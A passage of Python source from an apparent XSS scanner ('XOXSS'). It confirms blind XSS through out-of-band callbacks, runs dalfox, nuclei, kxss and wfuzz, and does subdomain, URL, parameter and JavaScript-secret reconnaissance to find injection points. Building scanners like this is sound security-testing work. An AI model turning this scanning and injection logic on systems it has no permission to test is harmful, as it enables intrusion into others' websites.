            "full_id": hit.full_id,
            "source": hit.source or getattr(self.oob.source, "name", ""),
            "page_url": page_url,
            "cookies": cookies,
            "user_agent": callback_context.get("user_agent", ""),
            "referer": callback_context.get("referer", ""),
            "method": callback_context.get("method", ""),
            "raw": str(hit.raw or "")[:4000],
        }
        subkey = f"oob:{hit.marker}"
        for finding in self.findings:
            if finding.subkey != subkey:
                continue
            finding.kind = "Blind XSS (callback confirmed)"
            finding.confidence = "confirmed"
            finding.confidence_rationale = (
                "The injected payload caused a real out-of-band callback carrying this "
                "run's marker; the callback context is recorded in the finding."
            )
            finding.evidence = evidence
            finding.detail = detail
            finding.payload = registration.payload or finding.payload
            finding.oob = oob_detail
            finding.sink = finding.sink or "oob-callback"
            finding.response_excerpt = finding.response_excerpt or str(hit.raw or "")[:400]
            finding.tags = list(dict.fromkeys([*finding.tags, "oob", "confirmed"]))
            self.state.findings = [item.to_dict() for item in self.findings]
            self.state.save(force=True)
            self.console.finding(finding)
            return
        blind_point = InjectionPoint(
            url=registration.url,
            method=registration.method,
            param=registration.parameter,
        )
        blind_poc_url, blind_poc_command = self.poc_for_point(
            blind_point, registration.payload
        )
        self.add_finding(
            Finding(
                kind="Blind XSS (callback confirmed)",
                url=registration.url,
                parameter=registration.parameter,
                method=registration.method,
                payload=registration.payload,
                evidence=evidence,
                confidence="confirmed",
                confidence_rationale=(
                    "The injected payload caused a real out-of-band callback carrying this "
                    "run's marker; the callback context is recorded in the finding."
                ),
                context="blind",
                detail=detail,
                subkey=subkey,
                tags=["blind", "oob", "confirmed"],
                poc_url=blind_poc_url,
                poc_command=blind_poc_command,
                source="blind",
                sink="oob-callback",
                oob=oob_detail,
                response_excerpt=str(hit.raw or "")[:400],
            )
        )

    async def _drain_oob(self) -> None:
        if self.oob is None:
            return
        for hit in await self.oob.poll_once():
            self._confirm_oob(hit)
        wait = float(getattr(self.args, "oob_wait", 0.0) or 0.0)
        if wait <= 0:
            return
        interval = max(1.0, float(getattr(self.args, "oob_interval", 5.0) or 5.0))
        deadline = time.monotonic() + wait
        self.console.info(f"Waiting up to {wait:.0f}s for out-of-band callbacks", important=False)
        while time.monotonic() < deadline and not self._stop.is_set():
            await asyncio.sleep(min(interval, max(0.5, deadline - time.monotonic())))
            for hit in await self.oob.poll_once():
                self._confirm_oob(hit)
            if any(finding.kind == "Blind XSS (callback confirmed)" for finding in self.findings):
                break

    # -- external tool findings ---------------------------------------------------------
    async def _run_external_findings(self, urls: Sequence[str]) -> None:
        if not (
            getattr(self.args, "external_tools", False)
            and HAS_RECON
            and ExternalToolkit is not None
        ):
            return
        if self._stop.is_set():
            return
        toolkit = ExternalToolkit(
            self.console,
            timeout=max(60.0, self.args.timeout * 6),
            max_results=max(100, self.args.max_urls),
        )
        self.external_summary = toolkit.summary()
        self.console.info(f"External verification tools: {self.external_summary}", important=False)
        findings: List[Any] = []
        try:
            findings = await toolkit.dalfox(self.target, blind=self.blind_url or "")
        except Exception as exc:
            self.console.debug(f"dalfox failed: {exc}")
        try:
            sample = [self.target, *list(urls)[:20]]
            findings.extend(await toolkit.nuclei(sample, tags="xss"))
        except Exception as exc:
            self.console.debug(f"nuclei failed: {exc}")
        try:
            kxss_sample = [self.target, *list(urls)[:50]]
            kxss_results = await toolkit.probe_kxss(kxss_sample)
            for k_url, k_param, k_unfiltered in kxss_results:
                findings.append(
                    ExternalFinding(
                        tool="kxss",
                        url=k_url,
                        parameter=k_param,
                        payload=k_unfiltered,
                        evidence=f"Unfiltered characters: {k_unfiltered}",
                        severity="medium" if any(c in k_unfiltered for c in "<>'\"") else "low",
                    )
                )
        except Exception as exc:
            self.console.debug(f"kxss failed: {exc}")
        try:
            if toolkit.enabled("wfuzz"):
                from xoxss.scan.fuzzer import PARAM_WORDS
                import tempfile
                with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8") as wf:
                    wf.write("\n".join(PARAM_WORDS[:100]) + "\n")
                    wf_path = wf.name
                try:
                    for u in [self.target, *list(urls)[:5]]:
                        wfuzz_hits = await toolkit.fuzz_wfuzz(u, wf_path)
                        findings.extend(wfuzz_hits)
                finally:
                    with suppress(OSError):
                        os.unlink(wf_path)
        except Exception as exc:
            self.console.debug(f"wfuzz scan failed: {exc}")
        for item in findings:
            self._record_external_finding(item)

    def _record_external_finding(self, item: Any) -> None:
        self.external_findings.append(item)
        self.stats.external_findings = len(self.external_findings)
        severity = str(getattr(item, "severity", "medium") or "medium").lower()
        # Strict evidence policy: a third-party tool's claim is not proof.
        # XOXSS did not independently verify it, so it ships as confidence=low
        # with an explicit "unverified" tag; the PoC URL lets the operator
        # reproduce the claim in one click.
        confidence = "low"
        digest = hashlib.sha1(
            f"{getattr(item, 'tool', '')}|{getattr(item, 'url', '')}|"
            f"{getattr(item, 'parameter', '')}|{getattr(item, 'payload', '')[:200]}".encode(
                "utf-8", "replace"
            )
        ).hexdigest()[:10]
        self.add_finding(
            Finding(
                kind=f"XSS ({getattr(item, 'tool', 'external')} finding)",
                url=getattr(item, "url", self.target),
                parameter=getattr(item, "parameter", "") or "N/A",
                method=(getattr(item, "method", "GET") or "GET").upper(),
                payload=getattr(item, "payload", ""),
                evidence=getattr(item, "evidence", ""),
                confidence=confidence,
                context="external",
                detail=f"Reported by {getattr(item, 'tool', 'external tool')}"
                + (
                    f" (template {getattr(item, 'template', '')})"
                    if getattr(item, "template", "")
                    else ""
                )
                + " - NOT independently confirmed by XOXSS; reproduce via the PoC URL",
                subkey=f"external:{getattr(item, 'tool', 'tool')}:{digest}",
                tags=[getattr(item, "tool", "external"), "external", severity, "unverified"],
                poc_url=str(getattr(item, "url", "") or ""),
                source="external",
            )
        )

    async def _status_loop(self) -> None:
        last = self.stats.requests
        tick = 0
        rps = 0
        spin = 0
        while not self._stop.is_set():
            await asyncio.sleep(0.25)
            tick += 1
            if tick % 4 == 0:
                rps = self.stats.requests - last
                last = self.stats.requests
            spin = (spin + 1) % 10
            self.console.set_status(self._render_status(rps, spin))

    def _render_status(self, rps: int, spin: int) -> str:
        s = self.stats
        dim = bcolors.DIM
        label = bcolors.GREY
        bold = bcolors.BOLD
        if _ui is not None and _ui.enabled():
            spinner = _ui.paint(_ui.SPINNER[spin % len(_ui.SPINNER)], _ui.BRAND_BRIGHT)
            sep = _ui.paint("|", bcolors.GREY)
        else:
            spinner = ""
            sep = "|"
        findings_word = "findings "
        findings_val = len(self.findings)
        findings_part = (
            f"{bcolors.FAIL}{bcolors.BOLD}{findings_word}{findings_val}{bcolors.ENDC}"
            if findings_val
            else f"{label}{findings_word}{findings_val}{bcolors.ENDC}"
        )
        return (
            f"{spinner} {dim}[ {bcolors.ENDC}"
            f"{label}rps{bcolors.ENDC} {bold}{rps:>3}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}req{bcolors.ENDC} {bold}{s.requests:>6}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}urls{bcolors.ENDC} {bold}{s.urls_done}/{s.urls_total}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}points{bcolors.ENDC} {bold}{s.points}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{label}payloads{bcolors.ENDC} {bold}{s.payloads}{bcolors.ENDC} {dim}{sep}{bcolors.ENDC} "
            f"{findings_part} "
            f"{dim}]{bcolors.ENDC}"
        )

    # -- discovery --------------------------------------------------------------------
    async def discover_browser_requests(self, urls: Sequence[str]) -> List[str]:
        """Visit a bounded route sample and merge same-scope browser API traffic."""
        discovered: List[str] = []
        budget = min(25, max(1, int(getattr(self.args, "browser_discovery_pages", 10))))
        for url in urls[:budget]:
            if self._stop.is_set():
                break
            try:
                async with self.pool.borrow() as browser:  # type: ignore[union-attr]
                    await browser.navigate(url)
                    browser_data = await browser.collect()
                    requests = [
                        *browser_data.get("requests", []),
                        *getattr(browser, "observed_requests", []),
                    ]
                    for candidate in list(requests):
                        if not self.scope.in_scope(candidate) or looks_like_dangerous(candidate):
                            continue
                        try:
                            normalized = normalize_url(candidate)
                        except ValueError:
                            continue
                        if normalized not in discovered:
                            discovered.append(normalized)
                            self._record_endpoint(normalized, "browser-request")
                    for detail in browser_data.get("request_details", []):
                        if not isinstance(detail, dict):
                            continue
                        endpoint = str(detail.get("url") or "")
                        if not self.scope.in_scope(endpoint):
                            continue
                        try:
                            endpoint = normalize_url(endpoint)
                        except ValueError:
                            continue
                        method = str(detail.get("method") or "GET").upper()
                        # Browser discovery can observe state-changing verbs;
                        # only replay POST bodies, matching the scanner's
                        # existing form workflow and avoiding accidental PUT/
                        # PATCH/DELETE mutations during discovery.
                        if method != "POST":
                            continue
                        body_text = str(detail.get("post_data") or "")[:16000]
                        content_type = str(detail.get("content_type") or "").lower()
                        if not body_text:
                            continue
                        body: Dict[str, Any] = {}
                        is_json = "json" in content_type or body_text.lstrip().startswith("{")
                        if is_json:
                            try:
                                parsed_body = json.loads(body_text)
                                if isinstance(parsed_body, dict):
                                    body = parsed_body
                            except (TypeError, ValueError):
                                continue
                        else:
                            body = dict(parse_qsl(body_text, keep_blank_values=True))
                            if not body:
                                continue
                        if is_json:
                            def leaves(value: Any, path: Tuple[str, ...] = (), depth: int = 0) -> List[Tuple[Tuple[str, ...], Any]]:
                                if depth >= 12:
                                    return []
                                if isinstance(value, dict):
                                    return [item for key, child in value.items() for item in leaves(child, (*path, str(key)), depth + 1)]
                                if isinstance(value, list):
                                    return [item for index, child in enumerate(value[:100]) for item in leaves(child, (*path, str(index)), depth + 1)]
                                return [(path, value)] if isinstance(value, (str, int, float, bool)) else []

                            for json_path, value in leaves(body):
                                if not json_path:
                                    continue
                                point = InjectionPoint(
                                    url=endpoint, method=method, param=".".join(json_path), value=str(value),
                                    source="json", page_url=url, json_body=dict(body),
                                    content_type="application/json", extra={"json_path": list(json_path)},
                                )
                                candidates = self._browser_points.setdefault(endpoint, [])
                                if all(existing.key() != point.key() for existing in candidates):
                                    candidates.append(point)
                        else:
                            for parameter, value in body.items():
                                if not isinstance(value, (str, int, float, bool)):
                                    continue
                                fields = {
                                    str(name): FormField(name=str(name), value=str(field_value))
                                    for name, field_value in body.items()
                                }
                                point = InjectionPoint(
                                    url=endpoint, method=method, param=str(parameter), value=str(value),
                                    source="form", page_url=url, fields=fields,
                                    content_type=content_type or "application/x-www-form-urlencoded",
                                )
                                candidates = self._browser_points.setdefault(endpoint, [])
                                if all(existing.key() != point.key() for existing in candidates):
                                    candidates.append(point)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                self.console.debug(f"Browser route discovery failed for {truncate(url, 120)}: {exc}")
        if discovered:
            self.state.extra["browser_discovered_requests"] = discovered[:5000]
            self.console.info(f"Browser observed {len(discovered)} in-scope route/API URL(s)", important=False)
        return discovered

    async def recon_seeds(self) -> List[str]:
        """Run optional passive/active reconnaissance and return extra URLs."""
        if not HAS_RECON:
            return []
        subdomain_mode = bool(getattr(self.args, "subdomains", False)) or int(
            getattr(self.args, "subdomain_brute", 0) or 0
        ) > 0
        passive_mode = bool(getattr(self.args, "passive_urls", False))
        openapi_mode = bool(getattr(self.args, "openapi", False))
        fuzz_mode = bool(getattr(self.args, "fuzz_paths", False))
        mine_mode = bool(getattr(self.args, "mine_params", False))
        external_mode = bool(getattr(self.args, "external_tools", False))
        if not (subdomain_mode or passive_mode or openapi_mode or fuzz_mode or mine_mode or external_mode):
            return []

        parts = urlsplit(self.target)
        host = parts.hostname or ""
        domain = root_domain(host) if root_domain else host
        scheme = parts.scheme or "https"
        extra: List[str] = []

        if subdomain_mode and SubdomainFinder is not None:
            try:
                finder = SubdomainFinder(
                    self.http,
                    self.console,
                    timeout=max(8.0, self.args.timeout),
                    limit=max(100, self.args.max_urls * 2),
                )
                report = await finder.enumerate(
                    domain, brute_limit=max(0, int(getattr(self.args, "subdomain_brute", 0) or 0))
                )
                self.subdomains = list(report.resolved)
                self.stats.subdomains = len(self.subdomains)
                self.state.extra["subdomains"] = self.subdomains[:5000]
                extra.extend(
                    urlunsplit((scheme, sub, "/", "", "")) for sub in self.subdomains
                )
                for error in report.errors[:5]:
                    self.console.debug(f"Subdomain source error: {error}")
            except Exception as exc:
                self._record_recon_error("subdomain enumeration", exc)

        if passive_mode and PassiveURLCollector is not None:
            try:
                collector = PassiveURLCollector(
                    self.http,
                    self.console,
                    timeout=max(10.0, self.args.timeout),
                    limit=max(100, self.args.max_urls * 3),
                )
                report = await collector.collect(
                    domain, scope_filter=self.scope.in_scope
                )
                self.passive_urls = list(report.urls)
                self.stats.passive_urls = len(self.passive_urls)
                self.stats.discovered_params = max(
                    self.stats.discovered_params, len(report.parameters)
                )
                self.state.extra["passive_urls"] = self.passive_urls[:5000]
                self.state.extra["passive_parameters"] = report.parameters[:2000]
                extra.extend(self.passive_urls)
                for error in report.errors[:5]:
                    self.console.debug(f"Passive URL source error: {error}")
            except Exception as exc:
                self._record_recon_error("passive URL collection", exc)

        if openapi_mode and OpenAPIFinder is not None:
            try:
                finder = OpenAPIFinder(
                    self.http, self.console, timeout=max(5.0, self.args.timeout)
                )
                operations = await finder.discover(self.target)
                self.api_operations = list(operations)
                self.state.extra["openapi_operations"] = [
                    operation.to_dict() for operation in operations[:500]
                ]
                extra.extend(operation.url for operation in operations)
                if operations:
                    self.console.info(
                        f"OpenAPI: {len(operations)} operation(s) discovered", important=False
                    )
            except Exception as exc:
                self._record_recon_error("OpenAPI discovery", exc)

        if fuzz_mode and DirFuzzer is not None:
            try:
                fuzzer = DirFuzzer(
                    self.http,
                    self.console,
                    extensions=("",),
                    concurrency=min(10, max(1, self.args.concurrency)),
                    limit=min(500, max(50, self.args.max_urls)),
                    timeout=max(5.0, self.args.timeout),
                )
                fuzz_results = await fuzzer.discover(self.target)
                self.stats.fuzzed_paths = len(fuzz_results)
                for fuzz_result in fuzz_results:
                    extra.append(fuzz_result.url)
                    self._record_endpoint(fuzz_result.url, "fuzz")
            except Exception as exc:
                self._record_recon_error("path fuzzing", exc)

        if mine_mode and ParameterMiner is not None:
            try:
                miner = ParameterMiner(
                    self.http,
                    self.console,
                    marker=unique_token("p", 6),
                    concurrency=min(8, max(1, self.args.concurrency)),
                    timeout=max(5.0, self.args.timeout),
                )
                names = list(PARAM_WORDS)[
                    : max(1, int(getattr(self.args, "fuzz_param_limit", 10)) * 4)
                ]
                discovered = await miner.mine([self.target], names)
                self.stats.discovered_params = max(
                    self.stats.discovered_params, len(discovered)
                )
                for item in discovered:
                    self._mined_params.setdefault(item.url, []).append(item.name)
                    separator = "&" if "?" in item.url else "?"
                    extra.append(f"{item.url}{separator}{item.name}=1")
            except Exception as exc:
                self._record_recon_error("parameter mining", exc)

        if external_mode and ExternalToolkit is not None:
            toolkit = ExternalToolkit(
                self.console,
                timeout=max(30.0, self.args.timeout * 6),
                max_results=max(100, self.args.max_urls * 2),
            )
            self.external_summary = toolkit.summary()
            self.console.info(
                f"External recon tools: {self.external_summary}", important=False
            )
            hosts = await self._recon_call("external subdomain enumeration", toolkit.subdomains(domain), [])
            if hosts:
                live = await self._recon_call("external live-host probing", toolkit.live_hosts(hosts), [])
                discovered_hosts = live or [
                    urlunsplit((scheme, hostname, "/", "", "")) for hostname in hosts
                ]
                for url in discovered_hosts:
                    hostname = urlsplit(url).hostname or ""
                    if hostname and hostname not in self.subdomains:
                        self.subdomains.append(hostname)
                self.stats.subdomains = len(self.subdomains)
                self.state.extra["subdomains"] = self.subdomains[:5000]
                extra.extend(discovered_hosts)
            urls = await self._recon_call("external URL collection", toolkit.urls(domain), [])
            extra.extend(urls)
            crawl = await self._recon_call(
                "external browser-aware crawling",
                toolkit.crawl(self.target, depth=min(3, max(1, self.args.crawl_depth))),
                None,
            )
            if crawl is not None:
                extra.extend(crawl.urls)
            parameter_targets = list(dict.fromkeys(
                [self.target, *(url for url in self.passive_urls if self.scope.in_scope(url))]
            ))[: max(1, int(getattr(self.args, "max_param_targets", 100)))]
            discovered_parameters = await self._recon_call(
                "external parameter discovery", toolkit.parameters(parameter_targets), {}
            )
            external_parameter_state: Dict[str, List[str]] = {}
            for endpoint, names in discovered_parameters.items():
                if not self.scope.in_scope(endpoint):
                    continue
                if HAS_PARAM_AUDIT and ParameterHarvester is not None:
                    parameter_report = ParameterHarvester(
                        self.http, self.console, limit=max(1, self.args.max_urls)
                    ).from_names(endpoint, names, source="arjun/x8")
                    names = [candidate.name for candidate in parameter_report.candidates]
                self._mined_params.setdefault(endpoint, []).extend(names)
                self._mined_params[endpoint] = list(dict.fromkeys(self._mined_params[endpoint]))
                for name in names:
                    if name not in self.discovered_param_names:
                        self.discovered_param_names.append(name)
                external_parameter_state[endpoint] = names
                extra.append(endpoint)
            if external_parameter_state:
                self.stats.discovered_params += sum(
                    len(names) for names in external_parameter_state.values()
                )
                self.state.extra["external_parameters"] = external_parameter_state
                self.console.info(
                    f"External parameter discovery: "
                    f"{sum(len(names) for names in external_parameter_state.values())} name(s) "
                    f"across {len(external_parameter_state)} endpoint(s)",
                    important=False,
                )
            self.state.extra["external_tools"] = self.external_summary

        result: List[str] = []
        seen: Set[str] = set()
        for url in extra:
            if not url or not self.scope.in_scope(url) or looks_like_dangerous(url):
                continue
            try:
                normalized = normalize_url(url)
            except ValueError:
                continue
            if not normalized or normalized in seen:
                continue
            seen.add(normalized)
            result.append(url)
            self._record_endpoint(url, "recon")
        if result:
            self.console.info(
                f"Reconnaissance added {len(result)} URL(s)", important=False
            )
        return result[: max(1, self.args.max_urls)]

    async def _recon_call(self, label: str, operation: Any, default: Any) -> Any:
        """Isolate optional recon source failures so one tool cannot suppress others."""
        try:
            return await operation
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            self._record_recon_error(label, exc)
            return default

    def _record_recon_error(self, label: str, error: Exception) -> None:
        errors = self.state.extra.setdefault("recon_errors", [])
        if isinstance(errors, list) and len(errors) < 100:
            errors.append({"source": label, "error": str(error)[:1000]})
        self.console.warn(f"{label} failed: {error}")

    async def _endpoints_from_scripts(self, scripts: Sequence[DomScript], page_url: str) -> List[str]:
        endpoints: List[str] = []
        for script in scripts:
            if script.inline:
                endpoints.extend(extract_endpoints_from_text(script.content, page_url))
            else:
                endpoints.extend(await self._endpoints_from_js_file(script.url))
        return endpoints

    async def _endpoints_from_js_file(self, url: str) -> List[str]:
        max_files = max(0, int(getattr(self.args, "js_files", 25)))
        if url in self._js_seen or self._js_files_fetched >= max_files:
            return []
        self._js_seen.add(url)
        self._js_files_fetched += 1
        response = await self.http.get(url, cache=True)
        if response.error or not response.text or len(response.text) > 2_000_000:
            return []
        
        # Check for vulnerable JavaScript libraries
        if getattr(self.args, "check_libs", True):
            vulns = check_vulnerable_libs(url, response.text)
            for vuln in vulns:
                if vuln not in self.vulnerable_libs:
                    self.vulnerable_libs.append(vuln)
                    self.console.warn(
                        f"Vulnerable library: {vuln.name} {vuln.version} ({vuln.severity}) - {vuln.cve} @ {truncate(vuln.url, 80)}"
                    )
        
        # Advanced: Mutation XSS detection
        if HAS_ADVANCED and getattr(self.args, 'mxss', False):
            await self._detect_mxss(url, response.text)
        
        # Advanced: Prototype pollution detection
        if HAS_ADVANCED and getattr(self.args, 'proto_pollution', False):
            await self._detect_proto_pollution(url, response.text)

        self.stats.js_files += 1
        intel = None
        if HAS_RECON and analyze_javascript_intel is not None:
            try:
                intel = analyze_javascript_intel(
                    response.text, url, source=url, include_dom=True
                )
            except Exception as exc:
                self.console.debug(f"JS intelligence failed for {url}: {exc}")
        endpoints: List[str]
        if intel is None:
            endpoints = extract_endpoints_from_text(response.text, url)
        else:
            self.js_intel.append(intel)
            self.stats.secrets += len(intel.secrets)
            self.stats.ast_flows += len(intel.dom_flows)
            for secret in intel.secrets:
                self._record_secret(url, secret)
            for flow in intel.dom_flows:
                self._record_taint_flow(url, flow)
            if intel.parameters:
                for name in intel.parameters:
                    if name not in self.discovered_param_names:
                        self.discovered_param_names.append(name)
                self.stats.discovered_params = max(
                    self.stats.discovered_params, len(self.discovered_param_names)
                )
            endpoints = [*intel.endpoints, *intel.chunks]

        try:
            from xoxss.crawler.spa import SPACrawler

            for route in SPACrawler().discover_routes(response.text):
                route_url = urljoin(url, route.path)
                if self.scope.in_scope(route_url) and route_url not in endpoints:
                    endpoints.append(route_url)
        except Exception:
            pass
        return endpoints

    def _record_secret(self, url: str, secret: Any) -> None:
        severity = str(getattr(secret, "severity", "medium") or "medium").lower()
        confidence = "high" if severity in ("critical", "high") else "medium"
        digest = hashlib.sha1(
            str(getattr(secret, "value", "")).encode("utf-8", "replace")
        ).hexdigest()[:10]
        self.add_finding(
            Finding(
                kind="JavaScript secret exposure",
                url=url,
                parameter=getattr(secret, "kind", "secret"),
                method="GET",
                payload=getattr(secret, "masked", lambda: "")(),
                evidence=(
                    f"{getattr(secret, 'kind', 'secret')} ({severity}) at line "
                    f"{getattr(secret, 'line', 0)}: {getattr(secret, 'context', '')}"
                ),
                confidence=confidence,
                context="js",
                detail="Credential-like value in a client-side bundle; verify it is live and scoped.",
                subkey=f"secret:{getattr(secret, 'kind', 'secret')}:{digest}",
                tags=["secret", severity],
                source="secret",
            )
        )

    def _record_taint_flow(self, url: str, flow: Any) -> None:
        key = (
            f"{getattr(flow, 'source', '')}|{getattr(flow, 'sink', '')}|"
            f"{getattr(flow, 'line', 0)}|{getattr(flow, 'snippet', '')[:120]}"
        )
        if key in self._ast_seen:
            return
        self._ast_seen.add(key)
        sanitized = bool(getattr(flow, "sanitized", False))
        if sanitized and not getattr(self.args, "report_reflections", False):
            return
        if sum(1 for finding in self.findings if "ast" in finding.tags) >= 50:
            return
        score = float(getattr(flow, "confidence", 0.7) or 0.0)
        confidence = "low" if sanitized else ("high" if score >= 0.85 else "medium")
        digest = hashlib.sha1(key.encode("utf-8", "replace")).hexdigest()[:10]
        path = ", ".join(getattr(flow, "path", []) or []) or "direct"
        self.add_finding(
            Finding(
                kind="DOM XSS (taint flow)",
                url=url,
                parameter=getattr(flow, "source", "source"),
                method="GET",
                payload=getattr(flow, "snippet", ""),
                evidence=(
                    f"{getattr(flow, 'source', 'source')} -> "
                    f"{getattr(flow, 'sink', 'sink')} ({getattr(flow, 'context', 'dom')})"
                ),
                confidence=confidence,
                context="dom",
                detail=(
                    f"line {getattr(flow, 'line', 0)}; path {path}; score {score:.2f}"
                    + (
                        f"; sanitizer {getattr(flow, 'sanitizer', '')}"
                        if getattr(flow, "sanitizer", "")
                        else ""
                    )
                ),
                subkey=f"ast:{getattr(flow, 'line', 0)}:{getattr(flow, 'sink', '')}:{digest}",
                tags=["dom", "ast"],
                source="ast",
                sink=str(getattr(flow, "sink", "") or ""),
                dom_path=str(getattr(flow, "context", "") or ""),
                confidence_rationale=(
                    "A static taint path connects an attacker-controlled source to this "
                    "DOM sink; runtime execution was not confirmed."
                    if not sanitized
                    else "A sanitizer was detected on the path; this flow needs manual review."
                ),
            )
        )

    async def _scan_urls(self, urls: Sequence[str]) -> None:
        # A fixed worker count avoids allocating one asyncio task per URL for
        # very large recon results. Workers also keep failures visible.
        url_iterator = iter(urls)

        async def worker() -> None:
            while True:
                try:
                    url = next(url_iterator)
                except StopIteration:
                    return
                try:
                    await self.scan_url(url)
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    self.stats.urls_failed += 1
                    self.state.mark_url_status(url, "failed", str(exc))
                    self.state.save(force=True)
                    self.console.warn(f"URL scan failed ({truncate(url, 120)}): {exc}")

        await asyncio.gather(*(worker() for _ in range(min(max(1, self.args.threads), len(urls)))))

    async def scan_url(self, url: str) -> None:
        if self._stop.is_set():
            return
        if self.state.is_scanned(url) and not self.args.no_resume:
            self.console.debug(f"Skipping (already scanned): {url}")
            self.stats.urls_done += 1
            return

        self.console.info(f"Scanning {url}")
        completed = False
        interrupted = False
        error_message = ""
        self.state.mark_url_status(url, "running")
        try:
            # Advanced: JSONP detection
            if HAS_ADVANCED and getattr(self.args, 'jsonp', False):
                await self._test_jsonp(url)
            
            # Advanced: CSP analysis (also runs the Trusted Types audit)
            if HAS_ADVANCED and getattr(self.args, 'csp_analyze', False):
                await self._analyze_csp(url)

            # Advanced: CORS analysis
            if HAS_ADVANCED and getattr(self.args, 'cors_analyze', False):
                await self._analyze_cors(url)
            
            # Advanced: GraphQL endpoint detection (uses the cached page when possible)
            if HAS_ADVANCED and getattr(self.args, 'graphql', False):
                cached = self.http.peek(url) or await self.http.get(url, cache=True)
                if not cached.error and cached.text:
                    self._analyze_graphql(url, cached.text, cached.header("content-type", ""))

            if HAS_ADVANCED and getattr(self.args, "proto_pollution", False):
                await self.test_proto_pollution(url)

            points = await self.discover_points(url)
            self.console.debug(f"{len(points)} injection point(s) on {url}")
            for point in points:
                if self._stop.is_set():
                    return
                await self.test_point(point)
            if self.args.scan_headers:
                await self.test_headers(url)
            if self.args.dom:
                await self.test_dom(url)
            if getattr(self.args, "fragment_xss", False):
                await self.test_fragment(url)
            completed = True
        except asyncio.CancelledError:
            interrupted = True
            self.state.mark_url_status(url, "interrupted", "scan cancelled")
            raise
        except Exception as exc:
            error_message = str(exc)
            self.console.warn(f"Error scanning {truncate(url, 120)}: {exc}")
        finally:
            if interrupted:
                self.state.save(force=True)
            elif self._stop.is_set() and not completed:
                self.state.mark_url_status(url, "interrupted", "scan stopped before completion")
                self.state.save(force=True)
            elif not self._stop.is_set():
                if completed:
                    self.state.mark_scanned(url)
                else:
                    self.stats.urls_failed += 1
                    self.state.mark_url_status(url, "failed", error_message or "scan did not complete")
                self.state.save(force=True)
                self.stats.urls_done += 1

    def _candidate_param_wordlist(self) -> List[str]:
        """Load the operator's parameter-name wordlist (one name per line)."""
        if self._param_wordlist_cache is not None:
            return self._param_wordlist_cache
        names: List[str] = []
        path = getattr(self.args, "param_wordlist", None)
        if path:
            try:
                text = Path(str(path)).expanduser().read_text(
                    encoding="utf-8-sig", errors="replace"
                )
            except Exception as exc:
                self.console.warn(f"Cannot read parameter wordlist {path}: {exc}")
                text = ""
            seen = set()
            for line in text.splitlines():
                name = line.strip().split("#", 1)[0].strip()
                if not name or len(name) > 80:
                    continue
                if "=" in name:
                    name = name.split("=", 1)[0].strip()
                if not name or name in seen:
                    continue
                seen.add(name)
                names.append(name)
            if names:
                self.console.info(
                    f"Loaded {len(names)} parameter name(s) from {path}",
                    important=False,
                )
        self._param_wordlist_cache = names
        return names

    async def discover_points(self, url: str) -> List[InjectionPoint]:
        points: List[InjectionPoint] = []
        seen: Set[str] = set()
        discovered_names: Set[str] = set()

        def add(point: InjectionPoint) -> None:
            key = point.key()
            if key not in seen:
                seen.add(key)
                points.append(point)

        # ----------------------------------------------------------------------
        # Parameter Discovery Phase 1: High-priority discovered parameters
        # ----------------------------------------------------------------------
        # 1. URL Query String
        for name, value in parse_qsl(urlsplit(url).query, keep_blank_values=True):
            discovered_names.add(name)
            add(
                InjectionPoint(
                    url=url,
                    method="GET",
                    param=name,
                    value=value,
                    source="query",
                    param_source="discovered",
                    page_url=url,
                )
            )

        # 2. Browser-observed points
        for point in self._browser_points.get(url, []):
            discovered_names.add(point.param)
            point.param_source = "discovered"
            add(point)

        # 3. OpenAPI request bodies (JSON/form)
        for point in self._api_points(url):
            discovered_names.add(point.param)
            point.param_source = "discovered"
            add(point)

        # 4. JavaScript mined parameters
        for name in self._mined_params.get(url, [])[:25]:
            discovered_names.add(name)
            add(
                InjectionPoint(
                    url=url,
                    method="GET",
                    param=name,
                    value="",
                    source="query",
                    param_source="discovered",
                    page_url=url,
                )
            )

        # 5. Explicit parameter wordlists
        wordlist = self._candidate_param_wordlist()
        if wordlist:
            limit = max(1, int(getattr(self.args, "param_wordlist_limit", 50) or 50))
            for name in wordlist[:limit]:
                discovered_names.add(name)
                add(
                    InjectionPoint(
                        url=url,
                        method="GET",
                        param=name,
                        value="",
                        source="query",
                        param_source="discovered",
                        page_url=url,
                    )
                )

        # 6. Path-segment injection
        if getattr(self.args, "path_xss", False) and not looks_like_dangerous(url):
            for templated, path_index in build_path_vectors(url)[:8]:
                add(
                    InjectionPoint(
                        url=templated,
                        method="GET",
                        param="PATH",
                        value="",
                        source="path",
                        param_source="discovered",
                        path_index=path_index,
                        page_url=url,
                    )
                )

        response = await self.http.get(url, cache=True)
        resp_text = response.text if (response and not response.error and response.text) else ""

        # 7. HTML Forms and Links discovery
        if HAS_BS4 and resp_text:
            content_type = response.header("content-type", "").lower()
            if not content_type or "html" in content_type:
                soup = _soup(resp_text)
                for index, form in enumerate(soup.find_all("form")):
                    action, method, fields = parse_form(form, url)
                    if not self.scope.in_scope(action):
                        continue
                    for name, spec in list(fields.items())[:40]:
                        discovered_names.add(name)
                        add(
                            InjectionPoint(
                                url=action,
                                method=method.upper(),
                                param=name,
                                value=spec.value,
                                source="form",
                                param_source="discovered",
                                form_index=index,
                                fields=fields,
                                page_url=url,
                            )
                        )

                # Links carrying query strings
                if not self.args.crawl:
                    count = 0
                    for tag in soup.find_all("a", href=True):
                        href = tag.get("href")
                        if not isinstance(href, str):
                            continue
                        link = urljoin(url, href)
                        if "?" not in link or not self.scope.in_scope(link):
                            continue
                        if not looks_like_page(link):
                            continue
                        for name, value in parse_qsl(urlsplit(link).query, keep_blank_values=True):
                            discovered_names.add(name)
                            add(
                                InjectionPoint(
                                    url=link,
                                    method="GET",
                                    param=name,
                                    value=value,
                                    source="query",
                                    param_source="discovered",
                                    page_url=link,
                                )
                            )
                        count += 1
                        if count >= 25:
                            break

        # ----------------------------------------------------------------------
        # Parameter Discovery Phase 2: Gated fallback fuzzing
        # ----------------------------------------------------------------------
        # Gate: Do NOT fuzz invented parameter names blindly.
        # Only fuzz this list against an endpoint that shows evidence of accepting
        # query params (URL already has a query string, or the page/JS references
        # "?", location.search, or URLSearchParams).
